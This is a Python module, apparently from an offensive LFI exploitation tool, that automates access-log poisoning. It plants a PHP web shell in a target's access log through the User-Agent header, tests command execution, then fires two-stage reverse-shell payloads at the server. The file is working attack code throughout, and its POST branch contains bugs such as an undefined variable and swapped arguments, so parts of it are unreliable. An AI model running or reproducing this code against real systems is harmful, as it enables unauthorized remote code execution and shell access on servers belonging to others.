from src.utils.arguments import args
from src.httpreqs import request
from src.configs import config
from src.utils.args_check import scriptDirectory
import os
from src.utils import colors
from src.configs import config
from src.utils.info import printFancyString
from src.utils.info import printInfo

def exploit_log_poison(ip, port, url, payloadStageOne, payloadStageTwo, testPayload, testString, post):
    if(args.f):
        return

    maliciousHeaders = args.httpheaders.copy()
    maliciousHeaders['User-Agent'] = "<?php system($_GET['c']); ?>"
    lastPrintedStringLen = 0

    if(not os.path.exists(scriptDirectory + os.sep + "src/wordlists/http_access_log.txt")):
        print(colors.red("[-]") + " Cannot locate '" + scriptDirectory + os.sep + "src/wordlists/http_access_log.txt" + "' file that contains log locations")
        return

    with open(scriptDirectory + os.sep + "src/wordlists/http_access_log.txt", "r") as f:
        print(colors.green("[i]") + " Enumerating file system to discover access log location...")
        lines = f.readlines()
        for line in lines:
            line = line.strip()

            lastPrintedStringLen = printFancyString("Checking: " + line, lastPrintedStringLen)

            if(post): res, _ = request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, line), config.proxies, "", "", exploit = True)
            else: res, _ = request.REQUEST(url.replace(config.tempArg, line), args.httpheaders, post, config.proxies, "", "", exploit = True)

            if(args.httpheaders['User-Agent'] in res.text):
                lastPrintedStringLen = printFancyString("", lastPrintedStringLen)
                print("\n" + colors.green("[.]") + " Located canary in target's access log at '" + line + "'")

                #Upload web shell inside log
                if(post): request.REQUEST(url, maliciousHeaders, post.replace(config.tempArg, line), config.proxies, "", "", exploit = True)
                else: res, _ = request.REQUEST(url.replace(config.tempArg, line), maliciousHeaders, post, config.proxies, "", "", exploit = True)

                if(config.tempArg in url):
                    if("?" in url): exploitUrl = url.replace(config.tempArg, line) + "&c=" + testPayload
                    else: exploitUrl = url.replace(config.tempArg, line) + "?c=" + testPayload
                
                elif(config.tempArg in post):
                    exploitPost = post + "&c=" + payloadStageOne

                print(exploitUrl)
                res, _ = request.REQUEST(exploitUrl, args.httpheaders, post, config.proxies, "", "", exploit = True)

                if(testString in res.text):
                    printInfo(ip, port, "bash", "access log poisoning")
                      
                    if(config.tempArg in post):
                        print(colors.green("[.]") + " Executing stage 1 of the revshell payload...")
                        request.REQUEST(url, args.httpheaders, exploitPost, config.proxies, "", "", exploit = True)

                        if(payloadStageTwo != ""):
                            print(colors.green("[.]") + " Executing stage 2 of the revshell payload...")
                            request.REQUEST(url, exploitPost, args.httpheaders, config.proxies, "", "", exploit = True)
                            exploitPost = u + "&c=" + payloadStageTwo
                        break
                    
                    elif(config.tempArg in url):
                        exploitUrl = url.replace(config.tempArg, line) + "&c=" + payloadStageOne
                        print(colors.green("[.]") + " Executing stage 1 of the revshell payload...")
                        request.REQUEST(exploitUrl, args.httpheaders, post, config.proxies, "", "", exploit = True)
                        
                        if(payloadStageTwo != ""):
                            exploitUrl = url.replace(config.tempArg, line) + "&c=" + payloadStageTwo
                            print(colors.green("[.]") + " Executing stage 2 of the revshell payload. Check your listener...")
                            request.REQUEST(exploitUrl, args.httpheaders, post, config.proxies, "", "", exploit = True)
                        break
        else:
            #lastPrintedStringLen = printFancyString("", lastPrintedStringLen)
            if(args.verbose): printFancyString(colors.red("[-]") + " Couldn't locate target server's access log to poison or log is not readable.\n", lastPrintedStringLen)
            else: printFancyString("", lastPrintedStringLen)